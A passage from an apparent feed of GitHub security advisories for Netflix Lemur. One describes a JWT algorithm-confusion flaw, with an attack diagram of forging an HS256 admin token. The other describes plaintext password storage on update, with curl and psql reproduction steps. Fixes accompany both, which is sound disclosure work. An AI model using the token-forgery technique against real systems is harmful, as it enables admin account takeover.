1. lemur/auth/service.py:130-137 passes attacker-controlled alg into decode()
2. PyJWT 2.x rejects alg=none, so the antipattern is NOT directly exploitable
3. Chained with upstream config disclosure → HS256 forgery wins
</code></pre>

<h1 id="exploit-code--lab-set-up">Exploit Code &amp; Lab Set-up</h1>
<p><a href="https://github.com/user-attachments/files/28317909/Lemur-jwt-alg-hardening.zip">Lemur-jwt-alg-hardening.zip</a></p>
<h2 data-heading="Root Cause Analysis">Root Cause Analysis</h2>
<p>The pattern in <code>auth/service.py:130-137</code> is what every JWT-library author warns against. <code>pyjwt.decode</code>'s <code>algorithms</code> parameter exists precisely to pin the server's accepted set; the documentation calls out that callers should never pass the value from the token header. The author of this block likely intended to support multiple deployment configurations (some on HS256, some on RS256) and dispatched on the token's claimed algorithm — but the right way to do that is <code>algorithms=current_app.config["JWT_ACCEPTED_ALGS"]</code> (a server-pinned list), not <code>algorithms=[header_data["alg"]]</code> (the attacker's preference).</p>
<p>The PyJWT 2.x mitigation is the only thing standing between this code and a single-request <code>alg=none</code> ATO. That mitigation lives in PyJWT's <code>NoneAlgorithm.verify</code>, which raises <code>InvalidKeyError</code> when <code>alg=none</code> is supplied with a non-None key. Lemur passes a real key, so the path raises and Lemur catches it as <code>jwt.DecodeError</code> and returns 403. Good — but the protection is in the dependency, not in Lemur's code. A PyJWT-1.x backport, an accidental downgrade, or a future PyJWT behaviour change re-opens the door.</p>
<p>The RS256→HS256 confusion variant is the more durable concern. If an operator migrates Lemur from HS256 to RS256 — a normal hardening step — the attacker pins <code>alg=HS256</code> in the header and uses the RS256 <em>public key</em> as the HMAC secret. PyJWT 2.x's <code>decode_complete</code> does call <code>_verify_signature</code> with the supplied algorithm, and if the algorithm is HS256 and the "secret" is the bytes of the RS256 public key, the verifier passes. The fix is a server-pinned algorithm list; if the server only accepts <code>["RS256"]</code>, an attacker-supplied <code>alg=HS256</code> token fails at the <code>algorithms</code> check before any key material is consulted.</p>
<p>The MEDIUM 4.8 score honestly reflects what's exploitable today: the antipattern is real, the impact today is limited to (a) audit-log blinding and (b) a downgrade primitive that activates under separate conditions. I'm explicitly not claiming RS256→HS256 against current Lemur because Lemur today is HS256 — the "RS256 → HS256" trick doesn't apply because Lemur's secret arg is HMAC bytes, not an RSA pubkey. The fix is still worth making.</p>

<h2 data-heading="Attack Scenario">Attack Scenario</h2>

<pre><code class="language-mermaid">sequenceDiagram
    participant Attacker
    participant Lemur as Lemur API
    participant Disclosure as Disclosure surface
    participant Audit as Audit logging

    Note over Attacker,Lemur: "Today: PyJWT 2.x mitigation holds for alg=none"
    Attacker-&gt;&gt;Lemur: "Bearer alg=none token with [payload]"
    Lemur-&gt;&gt;Lemur: "pyjwt.decode raises (alg=none + non-None key)"
    Lemur--&gt;&gt;Attacker: "403 Forbidden"

    Note over Disclosure,Lemur: "Chain step: separate disclosure leaks LEMUR_TOKEN_SECRET"
    Attacker-&gt;&gt;Disclosure: "trigger debug / SSRF / backup leak"
    Disclosure--&gt;&gt;Attacker: "LEMUR_TOKEN_SECRET value"

    Note over Attacker,Lemur: "Forge HS256 admin token with leaked secret"
    Attacker-&gt;&gt;Lemur: "Bearer alg=HS256 admin token signed with leaked secret"
    Lemur-&gt;&gt;Lemur: "algorithms=[HS256] (taken from header) — accepted"
    Lemur--&gt;&gt;Attacker: "200 OK, role=admin"

    Note over Audit: "alg=HS256 in audit log - no anomaly flag because attacker picks alg"
</code></pre>
<h2 data-heading="Impact Assessment">Impact Assessment</h2>
<p>Today, in a fully-patched Lemur 1.9.0 on PyJWT 2.x, the standalone impact is C:L (audit-log surface is attacker-influenced) / I:L (an attacker who controls <code>alg</code> can downgrade a future verifier upgrade) / A:N. The vector requires no user interaction — the attacker just sends a crafted token directly — but AC:H reflects the real-world conditions that have to align (PyJWT version, future migration to asymmetric signing, or a separate disclosure issue) before standalone impact materializes. That's the 4.8 MEDIUM score. The chain step to single-request ATO depends on a separate disclosure issue, which I'm not claiming as part of this report.</p>
<p>The reason this is worth fixing now rather than later is that it's a one-line change with no behavioural risk, and the consequence of leaving it in place is a permanent downgrade vector against any algorithm migration Netflix later decides to do. Lemur's role in the certificate-signing pipeline makes its session tokens unusually high-value — anyone who forges a Lemur admin JWT can issue, revoke, and exfiltrate certificates across the org. The Lemur PKI compromise report submitted separately (ACME <code>acme_url</code> SSRF + creator IDOR) shows what an admin Lemur identity can do in practice.</p>
<p>If Lemur ever moves to asymmetric signing without fixing this sink, the score moves to CRITICAL on the same day. Fix it now.</p>
<h2 data-heading="Remediation">Remediation</h2>
<p>One-line server pin:</p>
<pre><code class="language-python"># lemur/lemur/auth/service.py:130-137
allowed_algs = current_app.config.get("JWT_ALGORITHMS", ["HS256"])
try:
    payload = decode_with_multiple_secrets(
        token, token_secrets, algorithms=allowed_algs
    )
except jwt.DecodeError:
    return dict(message="Token is invalid"), 403
</code></pre>
<p>Three follow-ups worth doing at the same time:</p>
<ol>
<li><strong>Log the algorithm the server actually applied, separately from the algorithm in the token header.</strong> This lets audit tooling see "the server enforced HS256 and the token claimed HS256" or, post-fix, "the server enforced RS256 and the token claimed HS256 — rejected", and flag mismatches.</li>
<li><strong>Pin <code>algorithms</code> to the smallest possible set.</strong> If Lemur only ever issues HS256, accept only HS256. Don't list every supported algorithm just because the library supports it.</li>
<li><strong>Migrate to asymmetric signing in a separate hardening PR</strong> once the algorithm pin is in. RS256 with key rotation removes the "leaked secret = forge admin" chain entirely.</li>
</ol>
### References

<ul>
<li><a href="https://github.com/Netflix/lemur/security/advisories/GHSA-r9gp-7f88-9r54">https://github.com/Netflix/lemur/security/advisories/GHSA-r9gp-7f88-9r54</a></li>
<li><a href="https://github.com/Netflix/lemur/releases/tag/v1.9.2">https://github.com/Netflix/lemur/releases/tag/v1.9.2</a></li>
<li><a href="https://github.com/advisories/GHSA-r9gp-7f88-9r54">https://github.com/advisories/GHSA-r9gp-7f88-9r54</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r9gp-7f88-9r54</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-25T22:05:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[lemur] Lemur user-update path stores plaintext passwords]]></title>
        <id>https://github.com/advisories/GHSA-q437-g7fv-2jvv</id>
        <link href="https://github.com/advisories/GHSA-q437-g7fv-2jvv"/>
        <updated>2026-06-25T22:02:14.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>lemur.users.service.update()</code> writes a user's new password as plaintext to the <code>users.password</code> column. The <code>User</code> model wires bcrypt hashing to SQLAlchemy's <code>before_insert</code> event but registers no equivalent listener for <code>before_update</code>, and <code>service.update()</code> does not call <code>user.hash_password()</code> after assigning the new value. Every password change performed through the admin-gated <code>PUT /api/1/users/&lt;id&gt;</code> endpoint persists the user's password to the database in cleartext.</p>
<h2 id="root-cause">Root Cause</h2>
<p><code>lemur/users/models.py</code>:</p>
<pre><code class="language-python"># line 38
class User(BaseModel):
    __tablename__ = "users"
    id = Column(Integer, primary_key=True)
    password = Column(String(128))            # plain column, no setter, no Vault descriptor

# line 74
    def hash_password(self):
        if self.password:
            self.password = bcrypt.generate_password_hash(self.password).decode("utf-8")

# line 111
listen(User, "before_insert", hash_password)  # only before_insert is wired
</code></pre>
<p><code>lemur/users/service.py</code>:</p>
<pre><code class="language-python"># line 46
def update(user_id, username, email, active, profile_picture, roles, password=None):
    ...
    user = get(user_id)
    user.username = username
    user.email = email
    user.active = active
    user.profile_picture = profile_picture
    if password:
        user.password = password              # raw assignment
    update_roles(user, roles)
    return database.update(user)              # commits, no hashing
</code></pre>
<p>No <code>before_update</code> listener exists. <code>User.password</code> is a plain <code>Column(String(128))</code> with no property setter that hashes on assignment. The bcrypt code path is bypassed entirely on every UPDATE statement that touches this column.</p>
<h2 id="affected-endpoints">Affected Endpoints</h2>
<table>
<thead>
<tr>
<th>Method</th>
<th>Path</th>
<th>Source</th>
</tr>
</thead>
<tbody><tr>
<td>PUT</td>
<td>/api/1/users/<code>&lt;id&gt;</code></td>
<td>lemur/users/views.py:274 (gated by <code>@admin_permission.require</code>)</td>
</tr>
</tbody></table>
<p><code>lemur/auth/views.py:323</code> also calls <code>user_service.update()</code> during SSO/OAuth login, but passes only six positional arguments. <code>password</code> defaults to <code>None</code> on that path and the <code>if password:</code> guard short-circuits. The bug is triggered only through the admin-only PUT handler.</p>
<h2 id="impact">Impact</h2>
<p>When an administrator changes a user's password via <code>PUT /api/1/users/&lt;id&gt;</code>, the cleartext password is persisted to <code>users.password</code>. Subsequent login attempts for that user will fail (<code>check_password</code> calls <code>bcrypt.check_password_hash</code> against an unhashed value), pushing operators toward workarounds.</p>
<p>The more serious consequence is a defense-in-depth bypass. Bcrypt is the protection that prevents a database compromise from yielding usable credentials. With plaintext rows present, an attacker who exfiltrates the <code>users</code> table, a backup, a read replica, or query logs obtains directly usable login credentials — no offline cracking required. Because users reuse passwords across services, the blast radius extends beyond Lemur.</p>
<p>The bug specifically affects admin-driven password resets, which are the normal post-incident workflow and exactly when plaintext storage is most harmful.</p>
<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
<ol>
<li><p>Install Lemur with default config. Create an admin user and a target user 'alice' (created via the standard flow, password will be hashed correctly on insert).</p>
</li>
<li><p>Verify the initial hash:
psql lemur -c "SELECT password FROM users WHERE username='alice';"</p>
<h1 id="output-2b12n9q---bcrypt-hash-as-expected">Output: $2b$12$N9Q...   (bcrypt hash, as expected)</h1>
</li>
<li><p>As admin, change alice's password via the API:
curl -X PUT <a href="https://lemur.local/api/1/users/">https://lemur.local/api/1/users/</a> <br> -H "Authorization: Bearer " <br> -H "Content-Type: application/json" <br> -d '{
   "username": "alice",
   "email": "<a href="mailto:alice@example.com">alice@example.com</a>",
   "active": true,
   "profile_picture": null,
   "roles": [{"name": "operator"}],
   "password": "ProofOfConcept_2026"
 }'</p>
</li>
<li><p>Read the column again:
psql lemur -c "SELECT password FROM users WHERE username='alice';"</p>
<h1 id="output-proofofconcept_2026---←-plaintext-not-hashed">Output: ProofOfConcept_2026   ← plaintext, not hashed</h1>
</li>
<li><p>Confirm the failure mode: 'alice' can no longer log in with 'ProofOfConcept_2026'
because check_password runs bcrypt.check_password_hash() against the cleartext column.</p>
</li>
</ol>
<h2 id="remediation">Remediation</h2>
<p>Register the listener for both events:</p>
<pre><code class="language-python"># lemur/users/models.py
listen(User, "before_insert", hash_password)
listen(User, "before_update", hash_password)
</code></pre>
<p>Alternative, equivalent fix in the service layer:</p>
<pre><code class="language-python"># lemur/users/service.py, in update()
    if password:
        user.password = password
        user.hash_password()
</code></pre>
<p>The listener fix is preferred because it closes the gap for any future code path that mutates <code>user.password</code>.</p>
<p>A one-time migration is recommended to detect and re-hash any rows already stored in cleartext. Bcrypt hashes begin with <code>$2b$</code>, <code>$2a$</code>, or <code>$2y$</code>. Any cleartext credential should be treated as <strong>compromised</strong> — rotate it, do not just re-hash it — since it has been at rest in plaintext and may exist in backups, audit logs, and replicas.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Netflix/lemur/security/advisories/GHSA-q437-g7fv-2jvv">https://github.com/Netflix/lemur/security/advisories/GHSA-q437-g7fv-2jvv</a></li>
<li><a href="https://github.com/Netflix/lemur/releases/tag/v1.9.2">https://github.com/Netflix/lemur/releases/tag/v1.9.2</a></li>
<li><a href="https://github.com/advisories/GHSA-q437-g7fv-2jvv">https://github.com/advisories/GHSA-q437-g7fv-2jvv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q437-g7fv-2jvv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-25T22:02:12.000Z</published>
    </entry>
</feed>